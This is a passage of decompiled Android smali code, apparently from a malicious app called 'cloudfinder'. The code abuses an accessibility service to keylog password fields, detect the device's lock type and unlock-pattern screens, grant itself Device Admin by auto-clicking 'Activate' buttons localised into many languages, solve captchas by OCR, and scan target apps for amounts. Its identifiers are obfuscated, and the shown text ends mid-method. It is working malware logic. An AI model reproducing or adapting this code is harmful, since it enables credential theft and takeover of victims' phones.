    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v0

    sput v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؼ:I

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_16

    invoke-static/range {p3 .. p3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result v0

    invoke-virtual {v3, v2}, Ljava/lang/String;->charAt(I)C

    move-result v2

    invoke-static {v2}, Ljava/lang/Character;->isDigit(C)Z

    move-result v2

    xor-int/2addr v2, v4

    if-eqz v0, :cond_14

    if-eqz v2, :cond_13

    const-string v0, "pwd2"

    goto :goto_c

    :cond_13
    const-string v0, "pwd"

    goto :goto_c

    :cond_14
    const-string v0, "apppwd"
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_6

    :goto_c
    :try_start_c
    new-instance v2, Landroid/graphics/Rect;

    invoke-direct {v2}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget v4, v2, Landroid/graphics/Rect;->left:I

    iget v5, v2, Landroid/graphics/Rect;->right:I

    add-int/2addr v4, v5

    div-int/lit8 v4, v4, 0x2

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, ","

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v4, v2, Landroid/graphics/Rect;->top:I

    iget v2, v2, Landroid/graphics/Rect;->bottom:I

    add-int/2addr v4, v2

    div-int/lit8 v4, v4, 0x2

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_5

    goto :goto_d

    :catch_5
    const/4 v12, 0x0

    :goto_d
    :try_start_d
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lسۄھؤۏ۫/؋;->س:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lسۄھؤۏ۫/؋;->ت:Ljava/lang/String;

    move-object v5, v0

    move-object v4, v2

    move-object v6, v3

    move-object v7, v12

    goto :goto_e

    :cond_15
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "text_"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v4, Lسۄھؤۏ۫/؋;->ت:Ljava/lang/String;

    const-string v5, "text"

    const/4 v7, 0x0

    move-object v2, v10

    move-object/from16 v3, p3

    move-object v6, v11

    invoke-static/range {v1 .. v7}, Lڜٟٱڀ/ت;->؋(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static/range {p3 .. p3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_16

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "keylog_t_"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "key"

    const-string v2, "keylog"

    move-object v4, v1

    move-object v5, v2

    move-object v6, v11

    const/4 v7, 0x0

    move-object v1, v0

    :goto_e
    move-object v2, v10

    move-object/from16 v3, p3

    invoke-static/range {v1 .. v7}, Lڜٟٱڀ/ت;->؋(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_6

    :catch_6
    :cond_16
    return-void
.end method

.method public final ؾ(Landroid/view/accessibility/AccessibilityEvent;Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 38

    move-object/from16 v1, p0

    move-object/from16 v2, p3

    move-object/from16 v3, p4

    move-object/from16 v4, p5

    const-string v5, "\u062a\u0641\u0639\u064a\u0644"

    const-string v6, "\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19"

    const-string v7, "K\u00edch ho\u1ea1t"

    const-string v8, "Aktifkan"

    const-string v9, "\u0410\u043a\u0442\u0438\u0432\u0438\u0440\u043e\u0432\u0430\u0442\u044c"

    const-string v10, "Attiva"

    const-string v11, "Aktivieren"

    const-string v12, "Activer"

    const-string v13, "Ativar"

    const-string v14, "Activar"

    const-string v15, "Activate"

    const-string v16, "\u6fc0\u6d3b"

    const-string v17, "\u542f\u52a8"

    const-string v3, ""

    move-object/from16 v18, v5

    const-string v5, "MyAccessSvc"

    const/16 v19, 0x1

    move-object/from16 v20, v6

    const/4 v6, 0x0

    if-nez v2, :cond_0

    move v0, v6

    goto :goto_0

    :cond_0
    :try_start_0
    sget-object v0, Lڝږ؁ڋ/و;->ؠ:Ljava/util/HashSet;

    invoke-virtual {v0, v2}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v0

    :goto_0
    if-eqz v0, :cond_1

    sput-boolean v19, Lڝږ؁ڋ/و;->؋:Z

    goto :goto_1

    :cond_1
    sget-boolean v0, Lڝږ؁ڋ/و;->؋:Z

    if-eqz v0, :cond_2

    sput-boolean v6, Lڝږ؁ڋ/و;->؋:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_2
    :goto_1
    :try_start_1
    sget-object v0, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    if-eqz v0, :cond_3

    sget-object v0, Lڝږ؁ڋ/ك;->ؤ:Ljava/lang/String;

    if-eqz v0, :cond_3

    sget-object v0, Lڝږ؁ڋ/ك;->ؤ:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    invoke-static {}, Lڝږ؁ڋ/ك;->ء()V

    :cond_3
    sput-boolean v6, Lڝږ؁ڋ/ك;->ث:Z

    sget-object v0, Lڝږ؁ڋ/ك;->ة:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->clear()V

    sget-object v0, Lڝږ؁ڋ/ك;->ت:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->clear()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    const/16 v22, 0x0

    :try_start_2
    sget-object v0, Lسۄھؤۏ۫/؋;->خ:Lorg/json/JSONArray;

    if-eqz v0, :cond_7

    sget-object v0, Lسۄھؤۏ۫/؋;->خ:Lorg/json/JSONArray;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    move-object/from16 v24, v7

    const/4 v6, 0x0

    :goto_2
    :try_start_3
    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v7

    if-ge v6, v7, :cond_6

    invoke-virtual {v0, v6}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v7

    if-eqz v7, :cond_4

    move-object/from16 v25, v0

    const-string v0, "used"
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    move-object/from16 v26, v8

    const/4 v8, 0x0

    :try_start_4
    invoke-virtual {v7, v0, v8}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_5

    const-string v0, "pkg"

    invoke-virtual {v7, v0, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    move-object v0, v2

    goto :goto_3

    :cond_4
    move-object/from16 v25, v0

    move-object/from16 v26, v8

    :cond_5
    add-int/lit8 v6, v6, 0x1

    move-object/from16 v0, v25

    move-object/from16 v8, v26

    goto :goto_2

    :cond_6
    move-object/from16 v26, v8

    move-object/from16 v0, v22

    :goto_3
    if-eqz v0, :cond_8

    new-instance v0, Ljava/lang/Thread;

    new-instance v6, Lڛڜڕڰڑ/؋;

    const/4 v7, 0x3

    invoke-direct {v6, v1, v2, v7}, Lڛڜڕڰڑ/؋;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;Ljava/lang/String;I)V

    const-string v7, "AmountScan"

    invoke-direct {v0, v6, v7}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    goto :goto_4

    :catch_2
    :cond_7
    move-object/from16 v24, v7

    :catch_3
    move-object/from16 v26, v8

    :catch_4
    :cond_8
    :goto_4
    :try_start_5
    sput-object v1, Lڝږ؁ڋ/ه;->ت:Landroid/content/Context;

    invoke-static/range {p3 .. p3}, Lڝږ؁ڋ/ه;->؋(Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    :catch_5
    :try_start_6
    invoke-static/range {p3 .. p3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result v0
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_9

    const-string v6, "unknown"

    if-nez v0, :cond_c

    :try_start_7
    sget-boolean v0, Lڝږ؁ڋ/ؼ;->؋:Z

    if-eqz v0, :cond_b

    sget-object v0, Lڝږ؁ڋ/ؼ;->ء:Lڝږ؁ڋ/آ;

    if-eqz v0, :cond_9

    sget-object v4, Lڝږ؁ڋ/ؼ;->ؠ:Landroid/os/Handler;

    invoke-virtual {v4, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    sput-object v22, Lڝږ؁ڋ/ؼ;->ء:Lڝږ؁ڋ/آ;

    :cond_9
    sget-object v0, Lڝږ؁ڋ/ؼ;->آ:Ljava/lang/Runnable;

    if-eqz v0, :cond_a

    sget-object v4, Lڝږ؁ڋ/ؼ;->ؠ:Landroid/os/Handler;

    invoke-virtual {v4, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    sput-object v22, Lڝږ؁ڋ/ؼ;->آ:Ljava/lang/Runnable;

    :cond_a
    invoke-static/range {p0 .. p0}, Lڝږ؁ڋ/ؼ;->إ(Landroid/accessibilityservice/AccessibilityService;)V

    invoke-static {}, Lڝږ؁ڋ/ؼ;->آ()V

    :cond_b
    invoke-static {}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ش()V

    invoke-static/range {v19 .. v19}, Lڜٟٱڀ/ت;->ؠ(Z)V

    sget-boolean v0, Lڝږ؁ڋ/ؽ;->؋:Z

    if-eqz v0, :cond_13

    const/4 v4, 0x0

    sput-boolean v4, Lڝږ؁ڋ/ؽ;->؋:Z

    sput-object v6, Lڝږ؁ڋ/ؽ;->ؠ:Ljava/lang/String;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_9

    goto/16 :goto_b

    :cond_c
    :try_start_8
    sget-boolean v0, Lڝږ؁ڋ/ؽ;->؋:Z

    if-nez v0, :cond_f

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_f

    sget-boolean v7, Lڝږ؁ڋ/ؽ;->؋:Z
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_6

    const-string v8, "LockTypeDetect"

    if-eqz v7, :cond_e

    :try_start_9
    sget-object v0, Lڝږ؁ڋ/ؽ;->ؠ:Ljava/lang/String;

    :cond_d
    move-object/from16 v25, v3

    :goto_5
    move-object v3, v0

    goto :goto_6

    :cond_e
    const/4 v7, 0x0

    invoke-static {v0, v7}, Lڝږ؁ڋ/ؽ;->ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-nez v7, :cond_d

    sput-boolean v19, Lڝږ؁ڋ/ؽ;->؋:Z

    sput-object v0, Lڝږ؁ڋ/ؽ;->ؠ:Ljava/lang/String;

    new-instance v7, Ljava/lang/StringBuilder;
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_6

    move-object/from16 v25, v3

    :try_start_a
    const-string v3, "Lock type detected: "

    invoke-direct {v7, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v8, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_5

    :catch_6
    :cond_f
    move-object/from16 v25, v3

    goto :goto_8

    :goto_6
    if-eqz v3, :cond_10

    invoke-virtual {v6, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_10

    sput-object v3, Lڝږ؁ڋ/ؽ;->ؠ:Ljava/lang/String;

    sput-boolean v19, Lڝږ؁ڋ/ؽ;->؋:Z
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_8

    :try_start_b
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v6, "lock_detect"

    const/4 v7, 0x0

    invoke-virtual {v0, v6, v7}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v6, "using_lock"

    invoke-interface {v0, v6, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_7

    goto :goto_7

    :catch_7
    move-exception v0

    :try_start_c
    const-string v6, "saveLockType"

    invoke-static {v8, v6, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_7
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "locktype_"

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v27

    invoke-static {}, Lسۄھؤۏ۫/؋;->ذ()Ljava/lang/String;

    move-result-object v28

    const-string v29, "com.android.systemui"

    const-string v30, ""

    const-string v31, "locktype"

    const/16 v33, 0x0

    move-object/from16 v32, v3

    invoke-static/range {v27 .. v33}, Lڜٟٱڀ/ت;->؋(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_8

    :catch_8
    :cond_10
    :goto_8
    if-eqz v4, :cond_14

    :try_start_d
    const-string v0, "\u7ed8\u5236\u56fe\u6848"

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const-string v0, "\u753b\u51fa\u89e3\u9501\u56fe\u6848"

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const-string v0, "\u5f00\u59cb\u7ed8\u5236\u56fe\u6848"

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const-string v0, "\u56fe\u6848\u89e3\u9501"

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const-string v0, "draw pattern"

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const-string v0, "draw unlock pattern"

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const-string v0, "Draw pattern"

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_11

    goto :goto_9

    :cond_11
    const/4 v0, 0x0

    goto :goto_a

    :cond_12
    :goto_9
    move/from16 v0, v19

    :goto_a
    if-eqz v0, :cond_14

    invoke-static/range {p3 .. p3}, Lڝږ؁ڋ/ؼ;->ؤ(Ljava/lang/String;)V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_a

    goto :goto_c

    :catch_9
    :cond_13
    :goto_b
    move-object/from16 v25, v3

    :catch_a
    :cond_14
    :goto_c
    :try_start_e
    sget-boolean v0, Lسۄھؤۏ۫/؋;->ب:Z

    if-eqz v0, :cond_18

    invoke-virtual/range {p4 .. p4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const-string v3, "alertdialog"

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_c

    if-eqz v0, :cond_18

    :try_start_f
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_b

    goto :goto_d

    :catch_b
    move-object/from16 v0, v22

    :goto_d
    if-nez v0, :cond_15

    goto :goto_e

    :cond_15
    :try_start_10
    sget-object v3, Lcom/lite/cloudfinder/App;->آ:Landroid/os/Handler;

    if-nez v3, :cond_16

    goto :goto_e

    :cond_16
    sget-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ت:Landroidx/constraintlayout/motion/widget/؋;

    if-eqz v4, :cond_17

    sget-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ت:Landroidx/constraintlayout/motion/widget/؋;

    invoke-virtual {v3, v4}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    :cond_17
    new-instance v4, Landroidx/constraintlayout/motion/widget/؋;

    const/16 v6, 0x14

    invoke-direct {v4, v6, v1, v0}, Landroidx/constraintlayout/motion/widget/؋;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    sput-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ت:Landroidx/constraintlayout/motion/widget/؋;

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ت:Landroidx/constraintlayout/motion/widget/؋;

    const-wide/16 v6, 0xc8

    invoke-virtual {v3, v0, v6, v7}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_c

    goto :goto_e

    :catch_c
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_18
    :goto_e
    const/16 v4, 0xa

    const/16 v6, 0x9

    const/16 v7, 0x8

    const/16 v27, 0x6

    const/16 v28, 0x7

    const/16 v29, 0x2

    const/16 v30, 0x4

    const/16 v31, 0x5

    :try_start_11
    sget-boolean v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    if-nez v0, :cond_23

    sget-boolean v0, Lسۄھؤۏ۫/؋;->ز:Z

    if-eqz v0, :cond_23

    if-eqz v2, :cond_23

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_e

    if-nez v0, :cond_23

    :try_start_12
    const-string v0, "device_policy"

    invoke-virtual {v1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v8, Landroid/content/ComponentName;

    const-class v3, Lcom/lite/cloudfinder/receiver/MainReceiver;

    invoke-direct {v8, v1, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    if-eqz v0, :cond_19

    invoke-virtual {v0, v8}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-eqz v0, :cond_19

    const/4 v3, 0x0

    sput-boolean v3, Lسۄھؤۏ۫/؋;->ز:Z

    const-string v0, "Device Admin already active, skipping auto-click"

    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_d

    return-void

    :catch_d
    :cond_19
    :try_start_13
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_20

    const/16 v3, 0x13

    new-array v8, v3, [Ljava/lang/String;

    const/16 v21, 0x0

    aput-object v17, v8, v21

    aput-object v16, v8, v19

    aput-object v15, v8, v29

    const/16 v23, 0x3

    aput-object v14, v8, v23

    aput-object v13, v8, v30

    aput-object v12, v8, v31

    aput-object v11, v8, v27

    aput-object v10, v8, v28

    aput-object v9, v8, v7

    aput-object v26, v8, v6

    aput-object v24, v8, v4

    const/16 v33, 0xb

    aput-object v20, v8, v33

    const/16 v34, 0xc

    aput-object v18, v8, v34

    const-string v34, "\u0938\u0915\u094d\u0930\u093f\u092f \u0915\u0930\u0947\u0902"

    const/16 v35, 0xd

    aput-object v34, v8, v35

    const-string v34, "\ud65c\uc131\ud654"

    const/16 v35, 0xe

    aput-object v34, v8, v35

    const-string v34, "\u6709\u52b9\u306b\u3059\u308b"

    const/16 v35, 0xf

    aput-object v34, v8, v35

    const-string v34, "Etkinle\u015ftir"

    const/16 v32, 0x10

    aput-object v34, v8, v32

    const-string v34, "Enable"

    const/16 v35, 0x11

    aput-object v34, v8, v35

    const-string v34, "\u542f\u7528"

    const/16 v35, 0x12

    aput-object v34, v8, v35

    const/4 v4, 0x0

    const/16 v35, 0x0

    :goto_f
    if-ge v4, v3, :cond_1f

    aget-object v3, v8, v4

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v36

    if-nez v36, :cond_1a

    goto :goto_14

    :cond_1a
    invoke-interface/range {v36 .. v36}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v36

    :goto_10
    invoke-interface/range {v36 .. v36}, Ljava/util/Iterator;->hasNext()Z

    move-result v37

    if-eqz v37, :cond_1d

    invoke-interface/range {v36 .. v36}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v37

    move-object/from16 v6, v37

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v37

    if-eqz v37, :cond_1b

    const/16 v7, 0x10

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Device Admin auto-click: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :goto_11
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    goto :goto_12

    :cond_1b
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-eqz v6, :cond_1c

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v7

    if-eqz v7, :cond_1c

    const/16 v7, 0x10

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Device Admin auto-click parent: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_11

    :goto_12
    invoke-static {v5, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move/from16 v35, v19

    goto :goto_13

    :cond_1c
    const/16 v6, 0x9

    const/16 v7, 0x8

    goto :goto_10

    :cond_1d
    :goto_13
    if-eqz v35, :cond_1e

    goto :goto_15

    :cond_1e
    :goto_14
    add-int/lit8 v4, v4, 0x1

    const/16 v3, 0x13

    const/16 v6, 0x9

    const/16 v7, 0x8

    goto :goto_f

    :cond_1f
    :goto_15
    move/from16 v8, v35

    goto :goto_16

    :cond_20
    const/4 v8, 0x0

    :goto_16
    if-nez v8, :cond_22

    invoke-static {v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-eqz v3, :cond_21

    if-eqz v0, :cond_21

    const-string v0, "Device Admin has captcha, starting OCR solve"

    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static/range {p0 .. p0}, Lڗًقڔ/ء;->ؾ(Landroid/accessibilityservice/AccessibilityService;)V

    return-void

    :cond_21
    invoke-static/range {p2 .. p2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ج(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v8

    :cond_22
    if-eqz v8, :cond_23

    invoke-virtual/range {p0 .. p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٵ()V
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_e

    goto :goto_17

    :catch_e
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_23
    :goto_17
    :try_start_14
    sget-boolean v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    if-nez v0, :cond_29

    if-eqz v2, :cond_29

    const-string v0, "settings"

